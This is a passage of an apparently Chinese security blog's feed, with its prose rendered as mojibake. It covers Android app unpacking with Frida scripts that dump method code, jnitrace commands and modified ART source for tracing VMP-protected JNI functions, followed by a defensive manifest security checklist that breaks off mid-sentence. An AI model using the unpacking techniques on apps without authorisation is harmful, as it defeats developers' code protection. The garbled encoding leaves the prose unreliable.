class="string">&quot;dumpMethodCode&quot;</span>, array);</span><br><span class="line">        dumpMethodCode.<span class="title function_">setAccessible</span>(<span class="literal">true</span>); <span class="comment">//dumpMethodCodeç§æœ‰æ–¹æ³•ï¼Œå–æ¶ˆæ£€æŸ¥</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpMethodCode-&gt;&quot;</span>, dumpMethodCode);</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">loadClassAndInvoke</span>(appClassloader, <span class="string">&quot;cn.cntv.ui.activity.SpringPlayerActivity&quot;</span>, dumpMethodCode);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¸»åŠ¨è°ƒç”¨æŸä¸ªç±»ä¸‹æ‰€æœ‰æ–¹æ³•+é…åˆfrida ==ã€‹å‡ºç°å¯¹æŠ—<br>é­”æ”¹fartç³»ç»Ÿï¼šçœ‹é›ª3wâ€“&gt;fartå…¨è‡ªåŠ¨è„±å£³â€“&gt;ç¬¬ä¹èŠ‚  é€šè¿‡è¯»é…ç½®æ–‡ä»¶classlistæ¥è°ƒç”¨dump</li></ul><h2 id="Fridaç‰ˆfartç®€å•ä½¿ç”¨">Fridaç‰ˆfartç®€å•ä½¿ç”¨</h2><p>githubä¸Šä¸‹è½½pyè„šæœ¬</p><p>è¿è¡Œappï¼Œå¼€å¯frida æ³¨å…¥è¿™ä¸ªè„šæœ¬</p><p>ç„¶åè¾“å…¥ï¼šdumpclass(â€œè¦dumpçš„ç±»åâ€)</p><p>å³å¯åœ¨/data/data/packageè·¯å¾„ä¸‹æ‰¾åˆ°</p><h1>VMP</h1><h2 id="vmpä¿æŠ¤çš„å‡½æ•°é€»è¾‘å¿«é€Ÿé€†å‘åˆ†ææ–¹æ³•">vmpä¿æŠ¤çš„å‡½æ•°é€»è¾‘å¿«é€Ÿé€†å‘åˆ†ææ–¹æ³•</h2><h3 id="jnitraceä½¿ç”¨">jnitraceä½¿ç”¨</h3><p>å‘½ä»¤ï¼š<code>jnitrace -l soæ–‡ä»¶å package</code> æŸ¥æ‰¾ä¸€ä¸ª.soæ–‡ä»¶</p><p><code>jnitrace -l * package</code> æŸ¥æ‰¾å¤šä¸ªso</p><p><code>jnitrace -l * -i jniå‡½æ•°å package</code> æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„è°ƒç”¨æ ˆ</p><p><code>jnitrace -l * -i ^Call package</code> æŸ¥çœ‹callå¼€å¤´å‡½æ•°</p><p><code>jnitrace -l * -i jniå‡½æ•°å -b none package</code> ä¸æ‰“å°backtrace å¯åŠ å¿«æ•ˆç‡</p><h3 id="å®šåˆ¶æ²™ç®±è·Ÿè¸ªvmpä¿æŠ¤çš„å‡½æ•°é€»è¾‘">å®šåˆ¶æ²™ç®±è·Ÿè¸ªvmpä¿æŠ¤çš„å‡½æ•°é€»è¾‘</h3><p>jniå‡½æ•°åœ¨è¿›å…¥å‰éƒ½ä¼šè¿›å…¥JNIMethodStartæ–¹æ³•</p><p>åœ¨Androidæºç 8.0ä¸­è¿›è¡Œé­”æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨InvokeWithArgArrayä¸­è¾“å‡ºjniå‡½æ•°å  </span></span><br><span class="line">ArtMethod* artMethod = nullptr;</span><br><span class="line">Thread* self=Thread::Current();</span><br><span class="line">const ManagedStack* managedStack=self-&gt;GetManagedStack();</span><br><span class="line"><span class="keyword">if</span>(managedStack!=nullptr)&#123;</span><br><span class="line">    ArtMethod** tmpartmethod=managedStack-&gt;GetTopQuickFrame();</span><br><span class="line">    <span class="keyword">if</span>(tmpartmethod!=nullptr)&#123;</span><br><span class="line">        artMethod=*tmpartmethodï¼›</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">LOG(ERROR)&lt;&lt;<span class="string">&quot;[InvokeWithArgArray]before call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod(); </span><br><span class="line">&#125; </span><br><span class="line">method-&gt;Invoke(soa.Self(),args,arg_array-&gt;GetNumBytes(),result,shorty);</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">    LOG(ERROR)&lt;&lt;<span class="string">&quot;[InvokeWithArgArray]after call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸Šè¿°æ²™ç®±æ–¹æ³•ä¼šè¾“å‡ºå…¶ä»–appçš„logæ‰“å°ï¼Œæ‰€ä»¥è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨InvokeWithArgArrayä¸­è¾“å‡ºjniå‡½æ•°å  </span></span><br><span class="line">ArtMethod* artMethod = nullptr;</span><br><span class="line">Thread* self=Thread::Current();</span><br><span class="line">const ManagedStack* managedStack=self-&gt;GetManagedStack();</span><br><span class="line"><span class="keyword">if</span>(managedStack!=nullptr)&#123;</span><br><span class="line">    ArtMethod** tmpartmethod=managedStack-&gt;GetTopQuickFrame();</span><br><span class="line">    <span class="keyword">if</span>(tmpartmethod!=nullptr)&#123;</span><br><span class="line">        artMethod=*tmpartmethodï¼›</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">std::ostringstream oss;</span><br><span class="line">    oss &lt;&lt;<span class="string">&quot;[InvokeWithArgArray]before call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod();</span><br><span class="line">    <span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;InvokeWithArgArrayBefore&quot;</span>))&#123;</span><br><span class="line">        LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">method-&gt;Invoke(soa.Self(),args,arg_array-&gt;GetNumBytes(),result,shorty);</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">   std::ostringstream oss;</span><br><span class="line">    oss &lt;&lt;<span class="string">&quot;[InvokeWithArgArray]after call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod();</span><br><span class="line">    <span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;InvokeWithArgArrayAfter&quot;</span>))&#123;</span><br><span class="line">        LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¯¹åœ°å€ç»‘å®š RegisterNativeæºç ä¸­æ·»åŠ ï¼Œæ‰“å°åœ°å€</span></span><br><span class="line">std::ostringstream oss;</span><br><span class="line">oss &lt;&lt;<span class="string">&quot;[ArtMethod::RegisterNative]jni Method:&quot;</span>&lt;&lt;<span class="built_in">this</span>-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;---addr:&quot;</span>&lt;&lt;native_method;</span><br><span class="line"><span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;RegisterNativeFlag&quot;</span>))&#123;</span><br><span class="line">    LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¯¹strstrå‡½æ•°è¿›è¡Œhookå°±å¯ä»¥è·å¾—æœ‰æ„ä¹‰çš„å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ğŸ±åˆ·æœºä¸éƒ¨åˆ†è„±å£³æœºã€è„±å£³ç‚¹çš„å…¥é—¨å­¦ä¹ </summary>
    
    
    
    <category term="è„±å£³" scheme="https://zxk1ng.github.io/categories/%E8%84%B1%E5%A3%B3/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="è„±å£³" scheme="https://zxk1ng.github.io/tags/%E8%84%B1%E5%A3%B3/"/>
    
    <category term="åˆ·æœº" scheme="https://zxk1ng.github.io/tags/%E5%88%B7%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Appå®‰å…¨åˆ†ææŒ‡å—</title>
    <link href="https://zxk1ng.github.io/posts/f416437f.html"/>
    <id>https://zxk1ng.github.io/posts/f416437f.html</id>
    <published>2025-01-15T06:38:47.000Z</published>
    <updated>2025-01-15T07:14:39.056Z</updated>
    
    <content type="html"><![CDATA[<h1>APPå®‰å…¨åˆ†æ</h1><h2 id="manifestæ–‡ä»¶æ£€æµ‹">manifestæ–‡ä»¶æ£€æµ‹</h2><h3 id="PermissionGroupæ£€æµ‹">PermissionGroupæ£€æµ‹</h3><p><strong>permissionæ ‡ç­¾</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot; | &quot;<span class="attr">dangerous</span>&quot; |</span></span><br><span class="line"><span class="tag">                                     &quot;<span class="attr">signature</span>&quot; | <span class="attr">...</span>] /&gt;</span></span><br><span class="line"></span><br><span class="line">//android:name ï¼šç”¨äºåœ¨ä»£ç ä¸­ï¼ˆä¾‹å¦‚ï¼Œåœ¨ <span class="tag">&lt;<span class="name">uses-permission</span>&gt;</span> å…ƒç´ æˆ–åº”ç”¨ç»„ä»¶çš„ permission å±æ€§ä¸­ï¼‰å¼•ç”¨æƒé™çš„åç§°</span><br><span class="line">    </span><br><span class="line">//android:permissionGroup : å°†æ­¤æƒé™åˆ†é…ç»™ä¸€ä¸ªç»„ã€‚æ­¤å±æ€§çš„å€¼æ˜¯è¯¥ç»„çš„åç§°ï¼Œä½¿ç”¨æ­¤åº”ç”¨æˆ–å…¶ä»–åº”ç”¨ä¸­çš„ <span class="tag">&lt;<span class="name">permission-group</span>&gt;</span> å…ƒç´ å£°æ˜ã€‚å¦‚æœæœªè®¾ç½®æ­¤å±æ€§ï¼Œåˆ™æ­¤æƒé™ä¸ä¼šå±äºæŸä¸ªç»„ã€‚</span><br></pre></td></tr></table></figure><p>ç”¨æ³•ï¼šå£°æ˜å¯¹äºé™åˆ¶å¯¹æ­¤åº”ç”¨æˆ–å…¶ä»–åº”ç”¨çš„ç‰¹å®šç»„ä»¶æˆ–åŠŸèƒ½çš„è®¿é—®æƒé™çš„å®‰å…¨æƒé™ã€‚</p><p><strong>permission-groupæ ‡ç­¾</strong></p><p>å£°æ˜ç›¸å…³æƒé™çš„é€»è¾‘åˆ†ç»„çš„åç§°ã€‚å„ä¸ªæƒé™é€šè¿‡ <code>&lt;permission&gt;</code> å…ƒç´ çš„ <code>permissionGroup</code> å±æ€§åŠ å…¥æƒé™ç»„ä¸­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission-group</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">// android:name : æƒé™ç»„çš„åç§°ã€‚è¿™æ˜¯å¯ä»¥åˆ†é…ç»™<span class="tag">&lt;<span class="name">permission</span>&gt;</span>å…ƒç´ çš„android:permissionGroupå±æ€§çš„åç§°</span><br></pre></td></tr></table></figure><p>å¦‚æœåœ¨<code>&lt;permission&gt;</code>æ ‡ç­¾æœ‰permissionGroupå±æ€§ï¼Œé‚£ä¹ˆå€¼åº”è¯¥ä¸ä¸ºç©ºã€‚å¦‚æœpermissionGroupçš„å±æ€§ä¸ºç©ºï¼Œä¼šå¯¼è‡´æƒé™å®šä¹‰æ— æ•ˆï¼Œä¸”å…¶ä»–appæ— æ³•ä½¿ç”¨è¯¥æƒé™ã€‚</p><h3 id="AndroidManifestæ–‡ä»¶ä¸­ç³»ç»Ÿæƒé™ä½¿ç”¨æ£€æµ‹"><strong>AndroidManifestæ–‡ä»¶ä¸­ç³»ç»Ÿæƒé™ä½¿ç”¨æ£€æµ‹</strong></h3><p>å½“appå¦‚æœä½¿ç”¨äº†ä¸€äº›ç³»ç»Ÿé™åˆ¶æƒé™ï¼Œå¦‚<code>android.permission.WRITE_SECURE_SETTINGS`å’Œ`android.permission.INSTALL_PACKAGES</code>ï¼Œåˆ™åº”è¯¥æ˜¯ç³»ç»Ÿæˆ–è€…è°·æ­Œè‡ªå¸¦çš„appåº”ç”¨ï¼Œå¦åˆ™å°±æ˜¯ä¸€ä¸ªæ¶æ„çš„app</p><p>è‹¥appä½¿ç”¨ä¸‹è¿°æƒé™ï¼Œåˆ™appæœ‰è¾ƒé«˜çš„æƒé™ï¼Œè¦è°¨æ…ä½¿ç”¨</p><ul><li><code>android.permission.MOUNT_FORMAT_FILESYSTEMS</code></li><li><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></li><li><code>android.permission.RESTART_PACKAGES</code></li></ul><p>æ£€æµ‹<code>&lt;uses-permission&gt;</code>ä¸­æ˜¯å¦æ¶‰åŠä»¥ä¸‹æƒé™çš„ç”³è¯·ï¼Œè‹¥æœ‰å…¶ä¸­çš„<strong>ä»»ä½•ä¸€ä¸ªå­˜åœ¨</strong>ï¼Œåˆ™å°†è¯¥æ‰«æé¡¹æ ‡æ³¨ä¸ºæé†’ï¼Œå¹¶å°†åˆé—®é¢˜çš„ä»£ç æ®µæ ‡æ³¨å‡ºæ¥ã€‚</p><p><strong>å¯¹äºä¸Šè¿°æƒé™åŠŸèƒ½è¡¥å……</strong></p><ul><li>android.permission.WRITE_SECURE_SETTINGSï¼šå…è®¸åº”ç”¨ç¨‹åºè¯»å–æˆ–è€…å†™å…¥å®‰å…¨ç³»ç»Ÿè®¾ç½®</li><li>android.permission.INSTALL_PACKAGESï¼šå…è®¸ç¨‹åºå®‰è£…åº”ç”¨</li><li>android.permission.MOUNT_FORMAT_FILESYSTEMSï¼šå…è®¸ç¨‹åºæ ¼å¼åŒ–å¯ç§»åŠ¨æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”å¦‚æ ¼å¼åŒ–æ¸…ç©ºsdå¡</li><li>android.permission.MOUNT_UNMOUNT_FILESYSTEMSï¼šå…è®¸ç¨‹åºæŒ‚è½½ï¼ŒåæŒ‚è½½å¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿ</li><li>android.permission.RESTART_PACKAGESï¼šå…è®¸åº”ç”¨ç¨‹åºé‡å¯å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªæƒé™é€šå¸¸åªå¯¹ç³»ç»Ÿåº”ç”¨å’Œç‰¹å®šçš„ç­¾ååº”ç”¨å¯ç”¨ï¼Œæ™®é€šåº”ç”¨æ— æ³•ä½¿ç”¨</li></ul><h3 id="AndroidManifestå±é™©ProtectionLevelæƒé™æ£€æµ‹">AndroidManifestå±é™©ProtectionLevelæƒé™æ£€æµ‹</h3><p>ç”±äº è‡ªå®šä¹‰çš„permissionçš„protectionLevelå±æ€§è®¾ç½®ä¸å½“ï¼Œä¼šå¯¼è‡´ç»„ä»¶æ•°æ®æ³„éœ²å±é™©ã€‚æœ€å¥½è®¾ç½®æƒé™ä¸º```signature<code>å’Œ</code>signatureOrSystem``ã€‚</p><p>æœªè®¾ç½®protectionLevelå±æ€§çš„æ—¶å€™é»˜è®¤ä¸ºnormalï¼Œè‹¥protectionLevelå±æ€§ä¸ºnormalæˆ–è€…æ˜¯dangerousæˆ–è€…æœªè®¾ç½®protectionLevelï¼Œå‡è®¤ä¸ºä¸å®‰å…¨ã€‚</p><p><img src="/posts/f416437f.htm/image-20240919202911887.png" alt="image-20240919202911887"></p><h3 id="AndroidManifest-sharedUserId-æ£€æµ‹">AndroidManifest sharedUserId æ£€æµ‹</h3><p><a href="https://www.cnblogs.com/wotakuc/archive/2013/03/27/2984423.html">Android sharedUserIdç ”ç©¶è®°å½• - wotakuc - åšå®¢å›­ (cnblogs.com)</a></p><p>é€šè¿‡sharedUserldå¯ä»¥è®©æ‹¥æœ‰åŒä¸€ä¸ªuser idçš„å¤šä¸ªapkè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹å½“ä¸­(è¿™ä¸ªsharedUseridå¯ä»¥éšä¾¿è®¾ç½®)ï¼Œäº’ç›¸è®¿é—®ä»»æ„èµ„æºã€‚sharedUseridè®¾ç½®ä¸º<code>android.uid.system</code>ï¼Œå¯ä»¥æŠŠappæ”¾åˆ°ç³»ç»Ÿè¿›ç¨‹ä¸­ï¼Œappå°†è·å¾—æå¤§çš„æƒé™ï¼Œå¦‚æœappåŒæ—¶æœ‰master keyæ¼æ´ï¼Œå®¹æ˜“è¢«root</p><p>å¦‚æœsharedUserIdè®¾ç½®ä¸º<code>android.uid.system</code>ä¸”appæœ‰master keyæ¼æ´ï¼Œåˆ™æ˜¯<code>é«˜å±</code>æ¼æ´ï¼›è‹¥æ²¡æœ‰master keyæ¼æ´ï¼Œåˆ™æ˜¯<code>æé†’</code></p><p>å…ˆæ£€æµ‹app/build.gradleä¸­çš„minSdkVersionï¼Œè‹¥ &lt;= 19ï¼Œåˆ™è¯´æ˜å…¶è¿è¡Œçš„ç³»ç»Ÿå¯èƒ½å­˜åœ¨mster keyæ¼æ´ï¼ˆAndroidç³»ç»Ÿ &lt;= 4.4ï¼Œå³API Level &lt;= 19å­˜åœ¨master keyæ¼æ´ï¼‰ã€‚æ­¤æ—¶è‹¥sharedUserIdè®¾ç½®ä¸º<code>android.uid.system</code>ï¼Œåˆ™æ ‡æ³¨ä¸º<code>é«˜å±</code>æ¼æ´ï¼›è‹¥minSdkVersion &gt;19 åˆ™æ˜¯æé†’ã€‚</p><p>å½“ç¨‹åºaå’Œç¨‹åºbä¸­å£°æ˜äº†åŒä¸€ä¸ªsharedUseridåï¼Œå¦‚æœbæƒ³è¦è·å–aç¨‹åºå½“ä¸­çš„ä¸€äº›èµ„æºï¼Œå¯ä»¥é€šè¿‡api  <strong>createPackageContext</strong>è·å–aç¨‹åºçš„contextï¼Œç„¶åè¿›ä¸€æ­¥è·å–açš„èµ„æºæˆ–æ•°æ®</p><h3 id="AndroidManifest-allowBackupæ£€æµ‹">AndroidManifest allowBackupæ£€æµ‹</h3><p>å½“API Level&gt;= 8æ—¶ï¼ˆå…¶å®å°äº8çš„APIç‰ˆæœ¬ç°åœ¨å·²ç»ç­ç»äº†ï¼‰ï¼ŒallowBackupè¿™ä¸ªæ ‡å¿—è¢«è®¾ç½®æˆtrueæˆ–<strong>ä¸è®¾ç½®è¯¥æ ‡å¿—ä½</strong>æ—¶ï¼Œåº”ç”¨ç¨‹åºæ•°æ®å¯ä»¥å¤‡ä»½å’Œæ¢å¤ï¼Œadbè°ƒè¯•å¤‡ä»½å…è®¸æ¶æ„æ”»å‡»è€…å¤åˆ¶åº”ç”¨ç¨‹åºæ•°æ®ã€‚</p><p>è‹¥è¦å¤‡ä»½ç¨‹åºçš„æ•°æ®ï¼Œå¯ä»¥é‡‡ç”¨è®¾ç½®è‡ªåŠ¨å¤‡ä»½ç¨‹åºçš„å‚æ•°<code>android:fullBackupContent=String</code>ï¼Œå¹¶æ·»åŠ ç›¸åº”çš„è§„åˆ™è¿›è¡Œé™åˆ¶ï¼Œè¿™ä¸ªè‡ªåŠ¨å¤‡ä»½ä¼šå°†ç”¨æˆ·ä¿ç•™åœ¨è®¾å¤‡ä¸­çš„æ•°æ®è‡ªåŠ¨ä¸Šä¼ è‡³ç”¨æˆ·çš„Google Driveè´¦æˆ·ã€‚åœ¨android 6.0å¼•å…¥çš„ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.my.appexample&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/mybackupscheme&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>android:fullBackupContent</code>å±æ€§æŒ‡å®šäº†ä¸€ä¸ª XML æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åä¸ºmybackupscheme.xmlï¼Œä½äºåº”ç”¨å¼€å‘é¡¹ç›®çš„ res/xml/ ç›®å½•ä¸­ã€‚ æ­¤é…ç½®æ–‡ä»¶åŒ…æ‹¬å…³äºè¦å¤‡ä»½å“ªäº›æ–‡ä»¶çš„è§„åˆ™ã€‚ ä¸‹åˆ—ç¤ºä¾‹ä»£ç æ˜¾ç¤ºäº†å°†æŸä¸€ç‰¹å®šæ–‡ä»¶æ’é™¤åœ¨å¤‡ä»½ä¹‹å¤–çš„é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">full-backup-content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">domain</span>=<span class="string">&quot;database&quot;</span> <span class="attr">path</span>=<span class="string">&quot;device_info.db&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">full-backup-content</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="AndroidManifest-Debuggableæ£€æµ‹">AndroidManifest Debuggableæ£€æµ‹</h3><p>åœ¨AndroidManifest.xmlä¸­å®šä¹‰Debuggableé¡¹ï¼Œå¦‚æœè¯¥é¡¹è¢«æ‰“å¼€ï¼Œappå­˜åœ¨è¢«æ¶æ„ç¨‹åºè°ƒè¯•çš„é£é™©ï¼Œå¯èƒ½å¯¼è‡´æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰é—®é¢˜ã€‚é»˜è®¤å€¼ false</p><p>é£é™©ç­‰çº§ï¼š<code>é«˜å±</code></p><h3 id="éå¿…è¦æƒé™æ£€æµ‹">éå¿…è¦æƒé™æ£€æµ‹</h3><p>æ£€æµ‹åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸å¿…è¦ä½¿ç”¨çš„æƒé™</p><ul><li><code>android.permission.ACCESS_MOCK_LOCATION</code>è¯¥æƒé™æ˜¯ä½¿åœ¨æ¨¡æ‹Ÿå™¨ä¸­ä½¿ç”¨ï¼Œç”¨äºè·å–æ¨¡æ‹Ÿå®šä½ä¿¡æ¯ï¼Œå®‰è£…åœ¨ç”¨æˆ·æ‰‹æœºä¸­çš„åº”ç”¨ä¸åº”è¯¥ç”³è¯·è¯¥æƒé™ã€‚</li></ul><p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p><h3 id="appæœ€ä½ç‰ˆæœ¬æ£€æŸ¥">appæœ€ä½ç‰ˆæœ¬æ£€æŸ¥</h3><p>ç½—åˆ—å‡ºè·Ÿæœ€ä½ç‰ˆæœ¬ç›¸å…³çš„æ¼æ´å’Œbugï¼Œæé†’å¼€å‘è€…æ³¨æ„è‡ªå·±åº”ç”¨æ”¯æŒçš„æœ€ä½ç‰ˆæœ¬çš„ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„é—®é¢˜</p><p>æ£€æµ‹app/build.gradleä¸­çš„minSdkVersionç¡®å®šAPPæ‰€æ”¯æŒçš„æœ€ä½ç‰ˆæœ¬çš„ç³»ç»ŸAPIï¼Œå¯¹åº”åˆ°ç›¸åº”çš„Androidç‰ˆæœ¬ä¸Šã€‚</p><h2 id="ç»„ä»¶å®‰å…¨æ£€æµ‹">ç»„ä»¶å®‰å…¨æ£€æµ‹</h2><h3 id="Activityç»„ä»¶å¯¼å‡ºæ£€æµ‹">Activityç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3><p>Activityç»„ä»¶å¯¹å¤–æš´éœ²ä¼šå¯¼è‡´æ•°æ®æ³„éœ²å’Œæ¶æ„çš„dosæ”»å‡»</p><p><strong>é£é™©ç­‰çº§</strong>ï¼šæé†’</p><p><strong>æ£€æµ‹è§„åˆ™ ï¼š</strong></p><ol><li>å…ˆæ£€æŸ¥ç»„ä»¶çš„android:exportedå±æ€§çš„å€¼ï¼Œè‹¥ä¸ºtrueæˆ–è€…æœªè®¾å®šè¯¥å±æ€§çš„å€¼ï¼Œåˆ™ç»§ç»­ç¬¬äºŒæ­¥æ“ä½œï¼›è‹¥ä¸ºfalseï¼Œåˆ™æ˜¯å®‰å…¨çš„</li><li>è‹¥ç»„ä»¶å«æœ‰æ ‡ç­¾ï¼Œå³ä½¿æœªè®¾ç½®exportedå±æ€§ï¼Œé»˜è®¤ä¹Ÿä¼šè®¾ç½®ä¸ºtrueï¼Œè‹¥ç»„ä»¶ä¸å«æœ‰æ 